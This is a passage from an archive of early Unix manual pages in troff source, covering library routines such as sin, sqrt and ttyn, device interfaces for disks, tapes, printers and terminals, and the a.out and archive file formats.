continues as if the call of 
.it setexit
had just returned.
All accessible data have values as of the
time 
.it reset 
was called.
.s3
The routine that called
.it setexit
must still be active when
.it reset
is called.
.sh "SEE ALSO"
signal (II)
.sh BUGS
-- /usr/man/man3/setfil.3 mode=0100664 uid=3 gid=3 atime=170022282 mtime=173059747 --
.th SETFIL III 10/29/73
.sh NAME
setfil \*- specify Fortran file name
.sh SYNOPSIS
.ft B
call setfil ( \fRunit\fB, \fRhollerith-string\fB )
.ft R
.sh DESCRIPTION
.it Setfil
provides a primitive way to associate
an integer I/O
.it unit
number with a file named by the
.it hollerith-string.
The end of the file name is indicated by a blank.
Subsequent I/O on this unit number will refer to
the file whose name is specified by
the string.
.s3
.it Setfil
should be called only before any I/O has been done on the
.it unit,
or just after doing a
.bd rewind
or
.bd endfile.
It is ineffective for unit numbers 5 and 6.
.sh "SEE ALSO"
fc (I)
.sh BUGS
The exclusion of units 5 and 6 is
unwarranted.
-- /usr/man/man3/sin.3 mode=0100664 uid=3 gid=3 atime=170022282 mtime=173059747 --
.th SIN III 3/15/72
.sh NAME
sin, cos \*- trigonometric functions
.sh SYNOPSIS
.nf
.ft B
jsr	pc,sin (cos)
.s3
double sin(x)
double x;
.s3
double cos(x)
double x;
.fi
.ft R
.sh DESCRIPTION
The
sine (cosine) of fr0 (resp. \fBx\fR), measured in radians,
is returned (in fr0).
.s3
The magnitude of the argument should be checked
by the caller to make sure the result is meaningful.
.sh BUGS
-- /usr/man/man3/sqrt.3 mode=0100664 uid=3 gid=3 atime=170022283 mtime=173059747 --
.th SQRT III 3/15/72
.sh NAME
sqrt \*- square root function
.sh SYNOPSIS
.br
.ft B
jsr	pc,sqrt
.s3
double sqrt(x)
.br
double x;
.ft R
.sh DESCRIPTION
The
square root of fr0 (resp. \fBx\fR) is returned (in fr0).
.sh DIAGNOSTICS
The c-bit is
set on negative arguments and 0 is returned.
There is no error return for C programs.
.sh BUGS
No error return from C.
-- /usr/man/man3/ttyn.3 mode=0100664 uid=3 gid=3 atime=170022284 mtime=173059747 --
.th TTYN III 1/15/73
.sh NAME
ttyn \*- return name of current typewriter
.sh SYNOPSIS
.ft B
jsr	pc,ttyn
.s3
ttyn(file)
.s3
.ft R
.sh DESCRIPTION
.it Ttyn
hunts up the last character of the name of the
typewriter which is the standard input (from \fIas\fR)
or is specified by the
argument
.it file
descriptor (from C).
If \fIn\fR is returned, the
typewriter name is then ``/dev/tty\fIn\fR''.
.s3
.bd x
is returned if the indicated file does not correspond to a
typewriter.
.sh BUGS
-- /usr/man/man4 mode=0140775 uid=3 gid=3 atime=173059757 mtime=173059709 --
-- /usr/man/man4/cat.4 mode=0100664 uid=3 gid=3 atime=170022289 mtime=173059757 --
.th CAT IV 10/27/73
.sh NAME
cat \*- phototypesetter interface
.sh DESCRIPTION
.it Cat
provides the interface to a Graphic Systems C/A/T
phototypesetter.
Bytes written on the file specify font, size, and other control
information as well as the characters to be flashed.
The coding will not be described here.
.s3
Only one process may have
this file open at a time.
It is write-only.
.sh FILES
/dev/cat
.sh "SEE ALSO"
troff (I),
Graphic Systems specification (available on request)
.sh BUGS
-- /usr/man/man4/dc.4 mode=0100664 uid=3 gid=3 atime=170022290 mtime=173059757 --
.th DC IV 5/27/74
.sh NAME
dc \*- DC-11 communications interface
.sh DESCRIPTION
The discussion of typewriter I/O given in
tty (IV) applies to these devices.
.s3
The DC-11 typewriter interface operates at any of four speeds,
independently settable for input and output.
The speed is selected by the same encoding used by the DH (IV)
device (enumerated in stty (II));
impossible speed changes are ignored.
.sh FILES
/dev/tty[01234567abcd]   113B Dataphones
(not currently connected\*- see dh (IV))
.sh "SEE ALSO"
tty (IV), stty (II), dh (IV)
.sh BUGS
-- /usr/man/man4/dh.4 mode=0100664 uid=3 gid=3 atime=170022290 mtime=173059757 --
.th DH IV 5/27/74
.sh NAME
dh \*- DH-11 communications multiplexer
.sh DESCRIPTION
Each line attached to the DH-11 communications multiplexer
behaves as described in tty (IV).
Input and output for each line may independently
be set to run at any of 16 speeds;
see stty (II)
for the encoding.
.sh FILES
/dev/tty[f-u]
.sh "SEE ALSO"
tty (IV), stty (II)
.sh BUGS
-- /usr/man/man4/dn.4 mode=0100664 uid=3 gid=3 atime=170022291 mtime=173059757 --
.th DN IV 3/20/74
.sh NAME
dn \*- DN-11 ACU interface
.sh DESCRIPTION
The
.it dn?
files
are write-only.
The permissible codes are:
.s3
.lp +8 4
0-9	dial 0-9
.lp +8 4
:	dial *
.lp +8 4
;	dial #
.lp +8 4
\*-	4 second delay for second dial tone
.lp +8 4
=	end-of-number
.s3
.i0
The entire telephone number must be
presented in a single
.it write
system call.
.s3
It is recommended that an end-of-number
code be given even though not all
ACU's actually require it.
.dt
.sh FILES
/dev/dn0	connected to 801 with dp0
.br
/dev/dn1	not currently connected
.br
/dev/dn2	not currently connected
.sh "SEE ALSO"
dp (IV)
.sh BUGS
-- /usr/man/man4/dp.4 mode=0100664 uid=3 gid=3 atime=170022292 mtime=173059758 --
.th DP IV 8/24/73
.sh NAME
dp \*- DP-11 201 data-phone interface
.sh DESCRIPTION
The
.it dp0
file
is a 201 data-phone interface.
.it Read
and
.it write
calls
to dp0
are limited to a maximum of 512 bytes.
Each write call is sent as a single record.
Seven bits from each byte
are written along with an eighth odd parity
bit.
The sync must be user supplied.
Each read call returns characters received from a
single record.
Seven bits are returned unaltered; the eighth bit
is set if the byte was not received in odd parity.
A 10 second time out is set and a zero-byte
record is returned if nothing is received in that time.
.sh FILES
/dev/dp0
.sh "SEE ALSO"
dn (IV), gerts (III)
.sh BUGS
-- /usr/man/man4/hp.4 mode=0100664 uid=3 gid=3 atime=170022293 mtime=173059758 --
.th HP IV 2/9/75
.sh NAME
hp \*- RH-11/RP04 moving-head disk
.sh DESCRIPTION
The files
.it "hp0 ... hp7"
refer to sections of RP disk drive 0.
The files
.it "hp8 ... hp15"
refer to drive 1 etc.
This is done since the size of
a full RP drive is 170,544 blocks and
internally the system is only capable
of addressing 65536
blocks.
Also since the disk is so large,
this allows it to be broken up
into more manageable pieces.
.s3
The origin and size of the pseudo-disks on each drive are
as follows:
.s3
.br
	disk	start	length
.br
	0	0	9614
.br
	1	18392	65535
.br
	2	48018	65535
.br
	3	149644	20900
.br
	4	0	40600
.br
	5	41800	40600
.br
	6	83600	40600
.br
	7	125400	40600
.s3
It is unwise for all of these files to be present in one installation,
since there is overlap in addresses and protection becomes
a sticky matter.
.s3
The
.it hp
files
access the disk via the system's normal
buffering mechanism
and may be read and written without regard to
physical disk records.
There is also a ``raw'' interface
which provides for direct transmission between the disk
and the user's read or write buffer.
A single read or write call results in exactly one I/O operation
and therefore raw I/O is considerably more efficient when
many words are transmitted.
The names of the raw RP files
begin with
.it rhp
and end with a number which selects the same disk
section as the corresponding
.it hp
file.
.s3
In raw I/O the buffer must begin on a word boundary,
and counts should be a multiple of 512 bytes
(a disk block).
Likewise
.it seek
calls should specify a multiple of 512 bytes.
.sh FILES
/dev/hp?, /dev/rhp?
.sh BUGS
-- /usr/man/man4/hs.4 mode=0100664 uid=3 gid=3 atime=170022294 mtime=173059758 --
.th HS IV 2/9/75
.sh NAME
hs \*- RH11/RS03-RS04 fixed-head disk file
.sh DESCRIPTION
The files
.it "hs0 ... hs7"
refer to
RJS03 disk drives 0 through 7.
The files
.it "hs8 ... hs15"
refer to
RJS04 disk drives 0 through 7.
The RJS03 drives are each 1024 blocks long and
the RJS04 drives are 2048 blocks long.
.s3
The
.it hs
files
access the disk via the system's normal
buffering mechanism
and may be read and written without regard to
physical disk records.
There is also a ``raw'' inteface
which provides for direct transmission between the disk
and the user's read or write buffer.
A single read or write call results in exactly one I/O operation
and therefore raw I/O is considerably more efficient when
many words are transmitted.
The names of the raw HS files begin with
.it rhs.
The same minor device considerations
hold for the raw interface as for the normal interface.
.s3
In raw I/O the buffer must begin on a word boundary,
and counts should be a multiple of 512 bytes
(a disk block).
Likewise
.it seek
calls should specify a multiple of 512 bytes.
.sh FILES
/dev/hs?, /dev/rhs?
.sh BUGS
-- /usr/man/man4/ht.4 mode=0100664 uid=3 gid=3 atime=170022295 mtime=173059758 --
.th HT IV 2/9/75
.sh NAME
ht \*- RH-11/TU-16 magtape interface
.sh DESCRIPTION
The files
.it "mt0, ..., mt7"
refer to the DEC RH/TM/TU16 magtape.
When opened for reading or writing,
the tape is rewound.
When closed, it is rewound;
if it was open for writing, a double end-of-file is written first.
.s3
A standard tape consists of a
series of 512 byte records terminated by a double
end-of-file.
To the extent possible, the system makes
it possible, if inefficient, to treat
the tape like any other file.
Seeks have their usual meaning and it is possible
to read or write a byte at a time.
Writing in very small units is inadvisable,
however, because it tends to create monstrous record
gaps.
.s3
The
.it mt
files discussed above are useful
when it is desired to access the tape in a way
compatible with ordinary files.
When foreign tapes are to be dealt with, and especially
when long records are to be read or written, the
``raw'' interface is appropriate.
The associated files are named
.it "rmt0, ..., rmt7."
Each
.it read
or
.it write
call reads or writes the next record on the tape.
In the write case the record has the same length as the
buffer given.
During a read, the record size is passed
back as the number of bytes read, provided it is no greater
than the buffer size;
if the record is long, an error is indicated.
In raw tape I/O, the buffer must begin on a word boundary
and the count must be even.
Seeks are ignored.
An error is returned when a tape mark is read,
but another read will fetch the first record of the
new tape file.
.sh FILES
/dev/mt?,
/dev/rmt?
.sh "SEE ALSO"
tp (I)
.sh BUGS
Raw I/O doesnt work yet.
The magtape system is supposed to be able
to take 64 drives.
Such addressing has never been tried.
These bugs will be fixed when
we get more experience with this device.
.s3
If any non-data error is encountered, it refuses to do anything
more until closed.
In raw I/O, there should be a way
to perform forward and backward record and file spacing and
to write an EOF mark.
-- /usr/man/man4/kl.4 mode=0100664 uid=3 gid=3 atime=170022296 mtime=173059758 --
.th KL IV 5/27/74
.sh NAME
kl \*- KL-11 or DL-11 asynchronous interface
.sh DESCRIPTION
The discussion of typewriter I/O given in tty (IV)
applies to these devices.
.s3
Since they run at a constant speed, attempts
to change the speed via stty (II) are ignored.
.s3
The on-line console typewriter is interfaced using
a KL-11 or DL-11.
By appropriate switch settings during a reboot,
UNIX will come up as a single-user system with I/O
on the console typewriter.
.sh FILES
/dev/tty8	console
.sh "SEE ALSO"
tty (IV), init (VIII)
.sh BUGS
Modem control for the DL-11E is not implemented.
-- /usr/man/man4/lp.4 mode=0100664 uid=3 gid=3 atime=170022298 mtime=173059758 --
.th LP IV 5/27/74
.sh NAME
lp \*- line printer
.sh DESCRIPTION
.it Lp
provides the interface to any of the standard
DEC line printers.
When it is opened or closed, a suitable number
of page ejects is generated.
Bytes written are printed.
.s3
An internal parameter within the driver determines
whether or not the device is treated as having
a 96- or 64-character set.
In half-ASCII mode, lower case letters are turned
into
upper case
and certain characters are escaped according to
the following table:
.s3
.if t .ig
.lp +10 5
{	(-
.lp +10 5
}	)-
.lp +10 5
\*g	\*a-
.lp +10 5
|	!-
.lp +10 5
~	^-
..
.if n .ig
.lp +10 5
{	\o"(\*-"
.lp +10 5
}	\o")\*-"
.lp +10 5
\*g	\o"\*a\*-"
.lp +10 5
|	\o"!\*-"
.lp +10 5
~	\o"^\*-"
..
.i0
.s3
The driver correctly interprets
carriage returns, backspaces, tabs, and form feeds.
A sequence of newlines which extends over the end of
a page is turned into a form feed.
All lines are indented 8 characters.
Lines longer than 80 characters are truncated.
These numbers are parameters in the driver;
another parameter allows indenting all printout
if it is unpleasantly near the left margin.
.sh FILES
/dev/lp
.sh "SEE ALSO"
lpr (I)
.sh BUGS
Half-ASCII mode, the indent and the maximum line length should
be settable by a call analogous to stty (II).
-- /usr/man/man4/mem.4 mode=0100664 uid=3 gid=3 atime=170022300 mtime=173059758 --
.th MEM IV 5/27/74
.sh NAME
mem, kmem, null  \*-  core memory
.sh DESCRIPTION
.it Mem
is a special file that is an image of the core memory
of the computer.
It may be used, for example, to examine,
and even to patch the system using the debugger.
.s3
A memory address is
an 18-bit quantity which
is used directly as a UNIBUS address.
References to non-existent locations cause errors to be returned.
.s3
Examining and patching device registers is likely
to lead to unexpected results when read-only or write-only
bits are present.
.s3
The file
.it kmem
is the same as 
.it mem
except that kernel virtual memory
rather than physical memory is accessed.
In particular, the I/O area
of
.it kmem
is located beginning at 160000 (octal)
rather than at 760000.
The 1K region beginning at 140000 (octal)
is the system's data for the current process.
.s3
The file
.it null
returns end-of-file
on
.it read
and ignores
.it write.
.sh FILES
/dev/mem,
/dev/kmem,
/dev/null
-- /usr/man/man4/pc.4 mode=0100664 uid=3 gid=3 atime=170022301 mtime=173059758 --
.th PC IV 10/15/73
.sh NAME
pc  \*-  PC-11 paper tape reader/punch
.sh DESCRIPTION
.it Ppt
refers to the PC-11 paper tape reader or punch,
depending on whether it is read or written.
.s3
When
.it ppt
is opened for writing, a 100-character leader
is punched.
Thereafter each byte written is punched on
the tape.  No editing of the characters
is performed.
When the file is closed, a 100-character trailer is punched.
.s3
When
.it ppt
is opened for reading, the process
waits until tape is placed in the reader and the reader
is on-line.
Then requests to read cause the characters read
to be passed back to the program, again without
any editing.
This means that several null leader characters
will usually appear at the beginning of the file.
Likewise several nulls are likely to appear at the end.
End-of-file is generated when the tape runs out.
.s3
Seek calls for this file are meaningless.
.sh FILES
/dev/ppt
.sh BUGS
If both the reader and the punch are open simultaneously,
the trailer is sometimes not punched.
Sometimes the reader goes into a dead state in which it cannot be
opened.
-- /usr/man/man4/rf.4 mode=0100664 uid=3 gid=3 atime=170022302 mtime=173059758 --
.th RF IV 10/15/73
.sh NAME
rf \*- RF11/RS11 fixed-head disk file
.sh DESCRIPTION
This file refers to the
concatenation of all RS-11 disks.
.s3
Each disk contains 1024 256-word blocks.
The length of the combined RF file is
1024\*X(minor+1) blocks.
That is minor device zero
is taken to be
1024 blocks long;
minor device one is 2048,
etc.
.s3
The
.it rf0
file
accesses the disk via the system's normal
buffering mechanism
and may be read and written without regard to
physical disk records.
There is also a ``raw'' interface
which provides for direct transmission between the disk
and the user's read or write buffer.
A single read or write call results in exactly one I/O operation
and therefore raw I/O is considerably more efficient when
many words are transmitted.
The name of the raw RF file is
.it rrf0.
The same minor device considerations
hold for the raw interface as for the normal interface.
.s3
In raw I/O the buffer must begin on a word boundary,
and counts should be a multiple of 512 bytes
(a disk block).
Likewise
.it seek
calls should specify a multiple of 512 bytes.
.sh FILES
/dev/rf0, /dev/rrf0
.sh BUGS
The 512-byte restrictions on the raw device are not
physically necessary,
but are still imposed.
-- /usr/man/man4/rk.4 mode=0100664 uid=3 gid=3 atime=170022304 mtime=173059758 --
.th RK IV 10/15/73
.sh NAME
rk  \*-  RK-11/RK03 (or RK05) disk
.sh DESCRIPTION
.it Rk?
refers to an entire RK03 disk as a single sequentially-addressed
file.
Its 256-word blocks are numbered 0 to 4871.
.s3
Drive numbers (minor devices)
of eight and larger are treated specially.
Drive 8+\fIx\fR is the \fIx\fR+1 way
interleaving of devices
rk0 to rk\fIx\fR.
Thus blocks on rk10 are distributed alternately
among rk0, rk1, and rk2.
.s3
The
.it rk
files
discussed above access the disk via the system's normal
buffering mechanism
and may be read and written without regard to
physical disk records.
There is also a ``raw'' interface
which provides for direct transmission between the disk
and the user's read or write buffer.
A single read or write call results in exactly one I/O operation
and therefore raw I/O is considerably more efficient when
many words are transmitted.
The names of the raw RK files
begin with
.it rrk
and end with a number which selects the same disk
as the corresponding
.it rk
file.
.s3
In raw I/O the buffer must begin on a word boundary,
and counts should be a multiple of 512 bytes
(a disk block).
Likewise
.it seek
calls should specify a multiple of 512 bytes.
.sh FILES
/dev/rk?, /dev/rrk?
.sh BUGS
Care should be taken in using the interleaved files.
First, the same drive should not be accessed simultaneously
using the ordinary name and as part of an interleaved file,
because the same physical
blocks
have in effect two different
names; this fools the system's buffering strategy.
Second, the combined files cannot be used for swapping
or raw I/O.
-- /usr/man/man4/rp.4 mode=0100664 uid=3 gid=3 atime=170022305 mtime=173059758 --
.th RP IV 2/21/74
.sh NAME
rp \*- RP-11/RP03 moving-head disk
.sh DESCRIPTION
The files
.it "rp0 ... rp7"
refer to sections of RP disk drive 0.
The files
.it "rp8 ... rp15"
refer to drive 1 etc.
This is done since the size of
a full RP drive is 81200 blocks and
internally the system is only capable
of addressing 65536
blocks.
Also since the disk is so large,
this allows it to be broken up
into more manageable pieces.
.s3
The origin and size of the pseudo-disks on each drive are
as follows:
.s3
.br
	disk	start	length
.br
	0	0	40600
.br
	1	40600	40600
.br
	2	0	9200
.br
	3	72000	9200
.br
	4	0	65535
.br
	5	15600	65535
.br
	6-7	unassigned
.s3
It is unwise for all of these files to be present in one installation,
since there is overlap in addresses and protection becomes
a sticky matter.
Here is a suggestion for two useful configurations:
If the root of the file system is on some other device
and the RP used as a mounted device,
then
.it rp0
and
.it rp1,
which divide the disk into two equal size portions, is a good idea.
Other things being equal, it is advantageous to have two equal-sized portions
since one can always be copied onto the other, which is occasionally useful.
.s3
If the RP is the only disk and has to
contain the root and the swap area,
the root can be put on
.it rp2
and a mountable file system on
.it rp5.
Then the swap space can be put in the
unused blocks 9200 to 15600 of
.it rp0
(or, equivalently,
.it rp4).
This arrangement puts the root file system, the swap area,
and the i-list of the mounted file system relatively
near each other and thus tends to
minimize head movement.
.s3
The
.it rp
files
access the disk via the system's normal
buffering mechanism
and may be read and written without regard to
physical disk records.
There is also a ``raw'' interface
which provides for direct transmission between the disk
and the user's read or write buffer.
A single read or write call results in exactly one I/O operation
and therefore raw I/O is considerably more efficient when
many words are transmitted.
The names of the raw RP files
begin with
.it rrp
and end with a number which selects the same disk
section as the corresponding
.it rp
file.
.s3
In raw I/O the buffer must begin on a word boundary,
and counts should be a multiple of 512 bytes
(a disk block).
Likewise
.it seek
calls should specify a multiple of 512 bytes.
.sh FILES
/dev/rp?, /dev/rrp?
.sh BUGS
-- /usr/man/man4/tc.4 mode=0100664 uid=3 gid=3 atime=170022306 mtime=173059758 --
.th TC IV 10/15/73
.sh NAME
tc \*- TC-11/TU56 DECtape
.sh DESCRIPTION
The files
.it "tap0 ... tap7"
refer to the
TC-11/TU56 DECtape drives 0 to 7.
.s3
The 256-word blocks on a standard DECtape are numbered 0 to 577.
.sh FILES
/dev/tap?
.sh "SEE ALSO"
tp (I)
.sh BUGS
-- /usr/man/man4/tm.4 mode=0100664 uid=3 gid=3 atime=170022306 mtime=173059758 --
.th TM IV 2/21/74
.sh NAME
tm \*- TM-11/TU-10 magtape interface
.sh DESCRIPTION
The files
.it "mt0, ..., mt7"
refer to the DEC TU10/TM11 magtape.
When opened for reading or writing,
the tape is rewound.
When closed, it is rewound;
if it was open for writing, an end-of-file is written first.
.s3
A standard tape consists of a
series of 512 byte records terminated by an
end-of-file.
To the extent possible, the system makes
it possible, if inefficient, to treat
the tape like any other file.
Seeks have their usual meaning and it is possible
to read or write a byte at a time.
Writing in very small units is inadvisable,
however, because it tends to create monstrous record
gaps.
.s3
The
.it mt
files discussed above are useful
when it is desired to access the tape in a way
compatible with ordinary files.
When foreign tapes are to be dealt with, and especially
when long records are to be read or written, the
``raw'' interface is appropriate.
The associated files are named
.it "rmt0, ..., rmt7."
Each
.it read
or
.it write
call reads or writes the next record on the tape.
In the write case the record has the same length as the
buffer given.
During a read, the record size is passed
back as the number of bytes read, provided it is no greater
than the buffer size;
if the record is long, an error is indicated.
In raw tape I/O, the buffer must begin on a word boundary
and the count must be even.
Seeks are ignored.
An error is returned when a tape mark is read,
but another read will fetch the first record of the
new tape file.
.sh FILES
/dev/mt?,
/dev/rmt?
.sh "SEE ALSO"
tp (I)
.sh BUGS
If any non-data error is encountered, it refuses to do anything
more until closed.
In raw I/O, there should be a way
to perform forward and backward record and file spacing and
to write an EOF mark.
-- /usr/man/man4/tty.4 mode=0110664 uid=3 gid=3 atime=170022310 mtime=173059758 --
.th TTY IV 5/27/74
.sh NAME
tty \*- general typewriter interface
.sh DESCRIPTION
This section describes
both a particular special file,
and the general nature of the typewriter interface.
.s3
The file
.it /dev/tty
is, in each process, a synonym
for the control typewriter associated with that process.
It is useful for programs or Shell sequences which wish to
be sure of writing messages on the typewriter
no matter how output has been redirected.
It can also be used for programs which demand a file name
for output, when typed output is desired
and it is tiresome to find out which typewriter
is currently in use.
.s3
As for typewriters in general: all of the low-speed asynchronous
communications ports use the
same general interface, no matter what
hardware is involved.
The remainder of this section discusses
the common features of the interface;
the KL, DC, and DH writeups (IV) describe
peculiarities of the individual devices.
.s3
When a typewriter file is opened, it causes
the process to wait until a connection is established.
In practice user's programs seldom open these
files; they are opened by
.it init
and become a user's
input and output file.
The very first typewriter file open in a process becomes
the
.it "control typewriter"
for that process.  The control typewriter plays a special
role in handling quit or interrupt signals, as discussed
below.
The control typewriter is inherited by a child process during a
.it fork.
.s3
A terminal associated with one of these files ordinarily
operates in full-duplex mode.  Characters may be typed at any time,
even while output is occurring, and are only lost when the
system's character input buffers become completely
choked, which is rare,
or when the user has accumulated the maximum allowed number of
input characters which have not yet been read by some program.
Currently this limit is 256 characters.
When the input limit is reached all the
saved characters are thrown away without notice.
.s3
These special files have a number of modes which can be changed
by use of the
.it stty
system call (II).
When first opened,
the interface mode is
300 baud;
either parity accepted;
10 bits/character (one stop bit);
and newline action character.
Modes that can be changed by
.it stty
include
the interface speed (if the hardware permits);
acceptance of even parity, odd parity, or both;
a raw mode in which all characters may be read one at a time;
a carriage return (CR) mode in which
CR is mapped into newline on input and
either CR or line feed (LF) cause echoing of
the sequence LF-CR;
mapping of upper case letters into lower case;
suppression of echoing;
a variety of delays after function characters;
and the printing of tabs as spaces.
See
.it getty
(VIII)
for the way that terminal speed and type are detected.
.s3
Normally, typewriter input is processed in units of lines.
This means that a program attempting
to read will be suspended until an entire line has been
typed.  Also, no matter how many characters are requested
in the read call, at most one line will be returned.
It is not however necessary to read a whole line at
once; any number of characters may be
requested in a read, even one, without losing information.
.s3
During input, erase and kill processing is normally
done.
By default, the character `#' erases the
last character typed, except that it will not erase
beyond the beginning of a line or an EOT.
By default, the character `@' kills the entire
line up to the point where it was typed, but not beyond an EOT.  Both these
characters operate on a keystroke basis independently
of any backspacing or tabbing that may have been done.
Either `@' or `#' may be entered literally by preceding
it by `\\';
the erase or kill character remains, but the
`\\' disappears.
These two characters may be changed to others.
.s3
When desired,
all upper-case letters are mapped into
the corresponding lower-case letter.
The upper-case letter may be generated by preceding
it by `\\'.
In addition, the following escape sequences are generated
on output and accepted on input:
.s3
.lp +14 7
for	use
.lp +15 7
\*g	\\\*a
.lp +15 7
.br
|	\\!
.br
.tr ??
.lp +15 7
~	\\^
.lp +15 7
{	\\(
.lp +15 7
}	\\)
.s3
.i0
In raw mode,
the program
reading is awakened on each character.
No erase or kill processing is done;
and the EOT, quit and interrupt characters
are not treated specially.
The input parity bit is passed back to the reader,
but parity is still generated for output characters.
.s3
The ASCII EOT (control-D) character may be used to generate an end of file
from a typewriter.
When an EOT is received, all the characters
waiting to be read are immediately passed to
the program, without waiting for a new-line,
and the EOT is discarded.
Thus if there are no characters waiting, which
is to say the EOT occurred at the beginning of a line,
zero characters will be passed back, and this is
the standard end-of-file indication.
The EOT is passed back unchanged in raw mode.
.s3
When the carrier signal from the dataset drops (usually
because the user has hung up his terminal)
a
.it hangup
signal is sent to all processes with the typewriter
as control typewriter.
Unless other arrangements have been made,
this signal causes the processes to terminate.
If the hangup signal is ignored, any read
returns with an end-of-file indication.
Thus programs which read a typewriter and test for
end-of-file on their input
can terminate appropriately when
hung up on.
.s3
Two characters have a special meaning when typed.
The ASCII DEL character (sometimes called `rubout')
is not passed to a program but generates
an
.it interrupt
signal
which is sent to all processes with the associated control typewriter.
Normally each such process is forced to terminate,
but arrangements may be made either to
ignore the signal or to receive a
trap to an agreed-upon location.
See
.it signal
(II).
.s3
The ASCII character FS generates the
.it quit
signal.
Its treatment is identical to the interrupt signal
except that unless a receiving process has
made other arrangements it will not only be terminated
but a core image file will be generated.
If you find it hard to type this character,
try control-\\ or control-shift-L.
.s3
When one or more
characters are written, they are actually transmitted
to the terminal as soon as previously-written characters
have finished typing.
Input characters are echoed by putting them in the output queue
as they arrive.
When a process produces characters more rapidly than they can be typed,
it will be suspended when its output queue exceeds some limit.
When the queue has drained down to some threshold
the program is resumed.
Even parity is always generated on output.
The EOT character is not transmitted
(except in raw mode)
to prevent terminals
which respond to it from hanging up.
.sh FILES
/dev/tty
.sh "SEE ALSO"
dc (IV), kl (IV), dh (IV), getty (VIII), stty (I, II), gtty (I, II), signal (II)
.sh BUGS
Half-duplex terminals are not supported.
On raw-mode output, parity should be transmitted as specified
in the characters written.
-- /usr/man/man5 mode=0140775 uid=3 gid=3 atime=173059767 mtime=173059709 --
-- /usr/man/man5/a.out.5 mode=0110664 uid=3 gid=3 atime=170022314 mtime=173059767 --
.th A.OUT V 9/9/73
.sh NAME
a.out \*- assembler and link editor output
.sh DESCRIPTION
.it A.out
is the output file of the assembler
.it as
and the link editor
.it ld.
Both programs make
.it a.out
executable if there were no
errors and no unresolved external references.
.s3
This file has four sections:
a header, the program and data text, a symbol table, and relocation bits
(in that order).
The last two may be empty
if the program was loaded
with the ``\*-s'' option
of
.it ld
or if the symbols and relocation have been
removed by
.it strip.
.s3
The header always contains 8 words:
.s3
.lp +5 3
1	A magic number (407, 410, or 411(8))
.lp +5 3
2	The size of the program text segment
.lp +5 3
3	The size of the initialized portion of the data segment
.lp +5 3
4	The size of the uninitialized (bss) portion of the data segment
.lp +5 3
5	The size of the symbol table
.lp +5 3
6	The entry location (always 0 at present)
.lp +5 3
7	Unused
.lp +5 3
8	A flag indicating relocation bits have been suppressed
.s3
.i0
The sizes of each segment are in bytes but are even.
The size of the header is not included in any of the other sizes.
.s3
When a file produced by the assembler or loader is
loaded into core for execution, three logical segments are
set up: the text segment, the data segment
(with uninitialized data, which starts off as all 0, following
initialized),
and a stack.
The text segment begins at 0
in the core image; the header is not loaded.
If the magic number (word 0) is 407, it indicates that the text
segment is not to be write-protected and shared,
so the data segment is immediately contiguous
with the text segment.
If the magic number is 410,
the data segment begins at the first 0 mod 8K byte
boundary following the text segment,
and the text segment is not writable by the program;
if other processes are executing the same file,
they will share the text segment.
If the magic number is 411,
the text segment is again pure, write-protected, and shared,
and moreover instruction and data space are separated;
the text and data segment both begin at location 0.
See the 11/45 handbook for restrictions which apply to this
situation.
.s3
The stack will occupy the highest possible locations
in the core image: from 177776(8) and growing downwards.
The stack is automatically extended as required.
The data segment is only extended as requested by
the
.it break
system call.
.s3
The start of the text segment in the file is 20(8);
the start of the data segment is 20+S\s6\dt\u\s10 (the size of the text)
the start of the relocation information is
20+S\s6\dt\u\s10+S\s6\dd\u\s10;
the start of the symbol table is
20+2(S\s6\dt\u\s10+S\s6\dd\u\s10)
if the
relocation information is present,
20+S\s6\dt\u\s10+S\s6\dd\u\s10
if not.
.s3
The symbol table consists of 6-word entries.  The first
four words contain the ASCII name of the symbol, null-padded.
The next word is a flag indicating the type of symbol.
The following values are possible:
.s3
.lp +6 3
00	undefined symbol
.lp +6 3
01	absolute symbol
.lp +6 3
02	text segment symbol
.lp +6 3
03	data segment symbol
.lp +6 3
37	file name symbol (produced by ld)
.lp +6 3
04	bss segment symbol
.lp +6 3
40	undefined external (.globl) symbol
.lp +6 3
41	absolute external symbol
.lp +6 3
42	text segment external symbol
.lp +6 3
43	data segment external symbol
.lp +6 3
44	bss segment external symbol
.i0
.s3
Values other than those given above may
occur if the user has defined some of his own instructions.
.s3
The last word of a symbol table entry contains the value of the symbol.
.s3
If the symbol's type is undefined external,
and the value field is non-zero,
the symbol is interpreted by the loader
.it ld
as
the name of a common region
whose size is indicated by the value of the
symbol.
.s3
The value of a word in the text or data portions which is not
a reference to an undefined external symbol
is exactly that value which will appear in core
when the file is executed.
If a word in the text or data portion
involves a reference to an undefined external symbol,
as indicated by the relocation bits
for that word,
then the value of the word as stored in the file
is an offset from the associated external symbol.
When the file is processed by the
link editor and the external symbol becomes
defined, the value of the symbol will
be added into the word in the file.
.s3
If relocation
information is present, it amounts to one word per
word of program text or initialized data.
There is no relocation information if the ``suppress relocation''
flag in the header is on.
.s3
Bits 3-1 of a relocation word indicate the segment referred
to by the text or data word associated with the relocation
word:
.s3
.lp +6 3
00	indicates the reference is absolute
.lp +6 3
02	indicates the reference is to the text segment
.lp +6 3
04	indicates the reference is to initialized data
.lp +6 3
06	indicates the reference is to bss (uninitialized data)
.lp +6 3
10	indicates the reference is to an undefined external symbol.
.i0
.s3
Bit 0 of the relocation word indicates if
.it on
that the
reference is relative to the pc (e.g. ``clr x'');
if
.it off,
that
the reference is to the actual symbol (e.g.,
``clr *$x'').
.s3
The remainder of the relocation word (bits 15-4)
contains a symbol number in the case of external
references, and is unused otherwise.
The first symbol is numbered 0, the second 1, etc.
.sh "SEE ALSO"
as (I), ld (I), strip (I), nm (I)
-- /usr/man/man5/archive.5 mode=0100664 uid=3 gid=3 atime=170022315 mtime=173059767 --
.th ARCHIVE V 9/10/73
.sh NAME
ar \*- archive (library) file format
.sh DESCRIPTION
The archive command
.it ar
is used to combine several files into
one.
Archives are used mainly as libraries to be searched
by the link-editor
.it ld.
.s3
A file produced by
.it ar
has a magic number at the start,
followed by the constituent files, each preceded by a file header.
The magic number is
177555(8)
(it was chosen to be unlikely to occur anywhere else).
The header of each file is 16 bytes long:
.s3
.lp +13 8
0-7	file
name, null padded on the right
.lp +13 8
8-11	modification
time of the file
.lp +13 8
12	user ID of file owner
.lp +13 8
13	file mode
.lp +13 8
14-15	file size
.s3
.i0
Each file begins on a word boundary;
a null byte is inserted between files if necessary.
Nevertheless the size give reflects the
actual size of the file exclusive of padding.
.s3
Notice there is no provision for empty areas in an archive
file.
.sh "SEE ALSO"
ar (I), ld (I)
.sh BUGS
Names are only 8 characters, not 14.
More important, there isn't enough room to
store the proper mode,
so
.it ar
always extracts in mode 666.
